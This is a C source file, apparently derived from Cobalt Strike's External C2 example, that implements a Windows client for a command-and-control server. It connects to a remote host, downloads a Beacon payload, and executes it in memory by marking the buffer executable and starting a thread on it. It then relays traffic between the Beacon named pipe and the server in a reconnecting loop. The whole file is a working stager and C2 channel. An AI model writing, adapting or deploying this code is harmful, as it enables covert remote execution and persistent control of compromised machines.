/*

Copyright 2016-2019 Strategic Cyber LLC

Redistribution and use in source and binary forms, with or without modification, are permitted provided that the
following conditions are met:

1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following
disclaimer.

2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following
disclaimer in the documentation and/or other materials provided with the distribution.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES,
INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

*/

/*
 * Build:
 * i686-w64-mingw32-gcc extc2example.c -o example.exe -lws2_32
 */

 /* a quick-client for Cobalt Strike's External C2 server */
#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include "Tools.h"
#include "Message.h"

#define PAYLOAD_MAX_SIZE 512 * 1024
#define BUFFER_MAX_SIZE 1024 * 1024

#pragma warning(disable:4996)


#define SECOND 1000


/* read a frame from a handle */
DWORD read_frame(HANDLE my_handle, char* buffer, DWORD max) {
	DWORD size = 0, temp = 0, total = 0;

	/* read the 4-byte length */
	ReadFile(my_handle, (char*)&size, 4, &temp, NULL);

	/* read the whole thing in */
	while (total < size) {
		ReadFile(my_handle, buffer + total, size - total, &temp, NULL);
		total += temp;
	}

	return size;
}

/* receive a frame from a socket */
DWORD recv_frame(SOCKET my_socket, char* buffer, DWORD max) {
	DWORD size = 0, total = 0, temp = 0;

	/* read the 4-byte length */
	recv(my_socket, (char*)&size, 4, 0);

	/* read in the result */
	while (total < size) {
		temp = recv(my_socket, buffer + total, size - total, 0);
		total += temp;
	}

	return size;
}

/* send a frame via a socket */
void send_frame(SOCKET my_socket, char* buffer, int length) {
	send(my_socket, (char*)&length, 4, 0);
	send(my_socket, buffer, length, 0);
}

/* write a frame to a file */
void write_frame(HANDLE my_handle, char* buffer, DWORD length) {
	DWORD wrote = 0;
	WriteFile(my_handle, (void*)&length, 4, &wrote, NULL);
	WriteFile(my_handle, buffer, length, &wrote, NULL);
}


BOOL MgPayload(SOCKET socket_extc2) {
	DWORD oldProtect = 0;
	int payloadSize;

	char* payload = VirtualAlloc(0, PAYLOAD_MAX_SIZE, MEM_COMMIT, PAGE_READWRITE);
	if (payload == NULL)
		return FALSE;
	payloadSize = recv_frame(socket_extc2, payload, PAYLOAD_MAX_SIZE);

	// Check if valid PE header 
	if (payload == NULL || payload[5] == 'M' || payload[6] == 'Z') {
		printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Recv payload error");
		return FALSE;
	}
	VirtualProtect(payload, payloadSize, PAGE_EXECUTE_READ, &oldProtect);
	// Inject the payload stage into the current process
	if (CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload, (LPVOID)NULL, 0, NULL) == NULL) {
		printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Fail to CreateThread");
		return FALSE;
	}
	return TRUE;
}

/* the main logic for our client */
BOOL csExternalC2(WCHAR* host, DWORD port) {
	char ipAddress[IP_ADDRESS_SIZE];
	sprintf_s(ipAddress, IP_ADDRESS_SIZE, "%ws", host);


	const char beaconBlockSize[] = "block=100";
#if _WIN64
	const char beaconArch[] = "arch=x64";
#else
	const char beaconArch[] = "arch=x86";
#endif
	BOOL exitProcess = FALSE;
	char pipeName[16];
	char filePipeName[128];
	char beaconPipeName[128];

	struct sockaddr_in 	sock;
	sock.sin_family = AF_INET;
	sock.sin_addr.s_addr = inet_addr(ipAddress);
	sock.sin_port = htons((u_short)port);

	printMsg(STATUS_INFO, LEVEL_DEFAULT, "Try to connect to server\n");
	while (!exitProcess) {
		SOCKET socket_extc2 = socket(AF_INET, SOCK_STREAM, 0);
		if (connect(socket_extc2, (struct sockaddr*)&sock, sizeof(sock))) {
			return FALSE;
		}
		printMsg(STATUS_OK, LEVEL_DEFAULT, "Connected to %s:%i\n", ipAddress, port);

		gen_random(pipeName, 15);
		sprintf_s(beaconPipeName, 128, "pipename=%s", pipeName); // 9 + 15 
		sprintf_s(filePipeName, 128, "\\\\.\\pipe\\%s", pipeName);

		send_frame(socket_extc2, (char*)beaconArch, sizeof(beaconArch) - 1);
		send_frame(socket_extc2, beaconPipeName, (int)strlen(beaconPipeName));
		send_frame(socket_extc2, (char*)beaconBlockSize, sizeof(beaconBlockSize) - 1);
		send_frame(socket_extc2, "go", 2);

		if (!MgPayload(socket_extc2))
			return FALSE;

		// Connect to our Beacon named pipe
		HANDLE handle_beacon = INVALID_HANDLE_VALUE;
		while (handle_beacon == INVALID_HANDLE_VALUE) {
			Sleep(1000);
			handle_beacon = CreateFileA(filePipeName, GENERIC_READ | GENERIC_WRITE,
				0, NULL, OPEN_EXISTING, SECURITY_SQOS_PRESENT | SECURITY_ANONYMOUS, NULL);
		}

		/* setup our buffer */
		char* buffer = (char*)malloc(BUFFER_MAX_SIZE); /* 1MB should do */
		if (buffer != NULL) {
			// Relay frames back and forth
			while (TRUE) {
				// read from our named pipe Beacon
				DWORD read = read_frame(handle_beacon, buffer, BUFFER_MAX_SIZE);
				if (read < 0) {
					break;
				}
				// write to the External C2 server
				send_frame(socket_extc2, buffer, read);
				// read from the External C2 server
				read = recv_frame(socket_extc2, buffer, BUFFER_MAX_SIZE);
				if (read < 0) {
					break;
				}
				// write to our named pipe Beacon
				write_frame(handle_beacon, buffer, read);
			}
			free(buffer);
		}
		// close our handles
		CloseHandle(handle_beacon);
		closesocket(socket_extc2);
		Sleep(5 * SECOND);
	}
	return TRUE;
}
